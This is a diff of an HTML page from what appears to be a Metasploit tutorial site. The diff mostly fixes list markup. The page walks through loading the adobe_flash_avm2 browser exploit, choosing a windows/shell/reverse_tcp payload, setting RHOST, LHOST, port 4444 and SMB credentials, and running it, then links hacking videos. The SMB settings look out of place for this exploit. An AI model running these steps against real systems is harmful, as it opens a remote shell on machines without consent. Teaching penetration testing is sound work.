@@ -141,77 +141,82 @@
                 Executing an Exploit
             </p>
             <p>The exploit must first be loaded, for example:</p>
-            <li>msf > use exploit/windows/browser/adobe_flash_avm2</li>
+            <ul>
+                <li>msf > use exploit/windows/browser/adobe_flash_avm2</li>
+            </ul>
             <p>
                 The above command sets the exploit to be used to a vulnerability found in an older version of Adobe Flash.
                 The vulnerability has been patched; however, if a patch has not been applied, it could be used to exploit the target system.
             </p>
             <p>To see information about the vulnerability the below command can be used:</p>
-            <li>msf exploit(adobe_flash_avm2) > info</li><br />
+            <ul>
+                <li>msf exploit(adobe_flash_avm2) > info</li>
+            </ul>
+            <br />
             <p>Help command within and exploit will give a list of available commands:</p>
-            <li>msf exploit(adobe_flash_avm2) > help</li><br />
+            <ul><li>msf exploit(adobe_flash_avm2) > help</li></ul><br />
             <p>Loading the exploit does nothing to the target. A payload must be used to exploit the vulnerability. To see the available payloads, use this command:</p>
-            <li>msf exploit(adobe_flash_avm2) > show payloads</li><br />
+            <ul><li>msf exploit(adobe_flash_avm2) > show payloads</li></ul><br />
             <p>After reviewing the payloads and finding the right one, use this command:</p>
-            <li>msf exploit(adobe_flash_avm2) > set PAYLOAD [copy and paste the payload from the payload list]</li><br />
+            <ul><li>msf exploit(adobe_flash_avm2) > set PAYLOAD [copy and paste the payload from the payload list]</li></ul><br />
             <p>Example:</p>
-            <li>msf exploit(adobe_flash_avm2) > set PAYLOAD windows/shell/reverse_tcp</li>
+            <ul><li>msf exploit(adobe_flash_avm2) > set PAYLOAD windows/shell/reverse_tcp</li></ul><br />
             <p>The credentials of the target must also be set. The entire command settings to make the exploit happen may look like this example:</p>
-            <p class="NoBullet-list">
-                <ol>1. msf > use exploit/windows/browser/adobe_flash_avm2</ol>
-                <ol>2. msf exploit(adobe_flash_avm2) > set RHOST 192.168.1.100</ol>
-                <ol>3. msf exploit(adobe_flash_avm2) > set PAYLOAD windows/shell/reverse_tcp</ol>
-                <ol>4. msf exploit(adobe_flash_avm2) > set LHOST 192.168.1.4</ol>
-                <ol>5. msf exploit(adobe_flash_avm2) > set LPORT 4444</ol>
-                <ol>6. msf exploit(adobe_flash_avm2) > set SMBUSER Admin</ol>
-                <ol>7. msf exploit(adobe_flash_avm2) > set SMBPASS Admin</ol>
-                <ol>8. msf exploit(adobe_flash_avm2) > exploit</ol>
+            <div class="NoBullet-list">
+                <ol>
+                    <li>1. msf > use exploit/windows/browser/adobe_flash_avm2</li>
+                    <li>2. msf exploit(adobe_flash_avm2) > set RHOST 192.168.1.100</li>
+                    <li>3. msf exploit(adobe_flash_avm2) > set PAYLOAD windows/shell/reverse_tcp</li>
+                    <li>4. msf exploit(adobe_flash_avm2) > set LHOST 192.168.1.4</li>
+                    <li>5. msf exploit(adobe_flash_avm2) > set LPORT 4444</li>
+                    <li>6. msf exploit(adobe_flash_avm2) > set SMBUSER Admin</li>
+                    <li>7. msf exploit(adobe_flash_avm2) > set SMBPASS Admin</li>
+                    <li>8. msf exploit(adobe_flash_avm2) > exploit</li>
+                </ol>
+            </div>
 
             <p>The previous commands do the following:</p>
-
-            <ol>1. Selects the exploit to use</ol>
-            <ol>2. Sets the remote host IP</ol>
-            <ol>3. Sets the payload</ol>
-            <ol>4. Sets the local host IP</ol>
-            <ol>5. Sets the port number</ol>
-            <ol>6. Sets the username</ol>
-            <ol>7. Sets the users password</ol>
-            <ol>8. Executes the commands</ol>
-            </p><br />
+            <ol>
+                <li>1. Selects the exploit to use</li>
+                <li>2. Sets the remote host IP</li>
+                <li>3. Sets the payload</li>
+                <li>4. Sets the local host IP</li>
+                <li>5. Sets the port number</li>
+                <li>6. Sets the username</li>
+                <li>7. Sets the users password</li>
+                <li>8. Executes the commands</li>
+            </ol>
+            <br />
             <h2>Video Resources</h2>
             <p class="Large-Font">
                 What is Metasploit - Metasploit Minute
             </p>
-            <iframe width="560" height="315" src="https://www.youtube.com/embed/TCPyoWHy4eA" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+            <iframe width="560" height="315" src="https://www.youtube.com/embed/TCPyoWHy4eA" title="YouTube video player"></iframe>
             <p class="Large-Font">
                 Metasploit for Beginners - #1 The Basics - Modules, Exploits & Payloads (This is the first of a four-part tutorial)
             </p>
-            <iframe width="560" height="315" src="https://www.youtube.com/embed/8lR27r8Y_ik" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+            <iframe width="560" height="315" src="https://www.youtube.com/embed/8lR27r8Y_ik" title="YouTube video player"></iframe>
             <p class="Large-Font">
                 Complete Metasploit System Hacking Tutorial!
             </p>
-            <iframe width="560" height="315" src="https://www.youtube.com/embed/_C7nRJ6WsmI" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+            <iframe width="560" height="315" src="https://www.youtube.com/embed/_C7nRJ6WsmI" title="YouTube video player"></iframe>
             <p>
                 Additional Resources
             </p>
-            <li><a href="https://www.metasploit.com/">Metasploit Home Page</a></li>
-            <li><a href="https://www.csoonline.com/article/3379117/what-is-metasploit-and-how-to-use-this-popular-hacking-tool.html">CSO: What is Metasploit and how to use this popular hacking tool</a></li>
-            <li><a href="https://www.upguard.com/blog/core-security-vs-rapid7">Upguard: Core security vs Rapid7 for Continuous Security</a></li>
-
-
-
+            <ul>
+                <li><a href="https://www.metasploit.com/">Metasploit Home Page</a></li>
+                <li><a href="https://www.csoonline.com/article/3379117/what-is-metasploit-and-how-to-use-this-popular-hacking-tool.html">CSO: What is Metasploit and how to use this popular hacking tool</a></li>
+                <li><a href="https://www.upguard.com/blog/core-security-vs-rapid7">Upguard: Core security vs Rapid7 for Continuous Security</a></li>
+            </ul>
             <br />
-
-
         </div>
-        <br><hr id="divider1"><br>
-        <h1 class="cybersecurity-content">
+        <br><hr><br>
+        <ul class="cybersecurity-content">
             <li><a href="the-armory.html">The Armory</a></li>
             <li><a href="MSFVENOM.html">MSFvenom</a></li>
             <li><a href="PIVOTING.html">Pivoting</a></li>
             <li><a href="POST-EXPLOITATING.html">Post-Exploitation</a></li>
-
-        </h1>
+        </ul>
 
         <footer>
             <br><hr id="divider1"><br>
